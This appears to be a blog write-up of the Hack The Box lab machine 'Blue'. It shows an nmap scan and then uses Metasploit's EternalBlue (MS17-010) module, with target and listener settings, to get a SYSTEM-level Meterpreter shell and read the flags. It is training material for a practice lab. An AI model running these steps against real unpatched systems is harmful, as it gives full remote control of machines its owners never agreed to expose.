---
title: "Blue Write-Up"
date: 2025-08-06T12:25:28-05:00
draft: false
author: Jarpiano
tags:
    - WriteUp
image: /images/blue-banner.png
description:
toc:
center: true
---
# Blue (Easy) Box

Blue is an easy machine on HTB. It covers the MS17_010 exploit, also known as the `EternalBlue` exploit.

## Initial Foothold & Escalation

According to the description, this machine is vulnerable to the `EternalBlue` exploit. We need to make sure that at least the SMB port 445 is open. Let's use an NMAP scan to check what ports are open.

<img src="/images/blue-image1.png" width="900" alt="Preview Image" />
<br>
<br>

A quick service scan should give us some clues on the architecture and services available. We can use this command:

```bash
nmap 10.129.236.187 -p 135,139,445,49152,49153,49154,49155,49156,49157 -sV -A
```

This gives some important pieces of information. There are various RPC services on the higher order ports, SMB is open with message signing disabled, and the machine is running on Windows 7 architecture.

For the `EternalBlue` exploit, we can use the Metasploit Framework's `MSFConsole` to easily exploit it. Let's launch the console.

```bash
msfconsole -q
```

Now we can search for it:

```msfconsole
search eternalblue
```

We should get several exploits. Alright, the SMB user that we had was just a user, so I skipped over the `psexec` exploit. There is, however, a Windows 7 exploit available that's kernel level. Let's use that one.

<img src="/images/blue-image2.png" width="900" alt="Preview Image" />
<br>
<br>

Let's use that using:

``` msfconsole
use 2
```

We can set up the right options with:

```
set RHOSTS 10.129.236.187
set LHOST <MY-IP>
```

All the other defaults are good. We can run it with the `run` or `exploit` command.

It takes a while but we should get a Meterpreter shell. We can drop a shell in Meterpreter with the `shell` command.

If we type `whoami`, we get that we are `nt authority\system`. This should give us both the user and root flag then.

We can go to the `haris` desktop to find the `flag.txt` file. For the root flag, we can go to the `Administrator` desktop to find the `flag.txt` file.

And that's it! Happy hacking.

**Fin.**

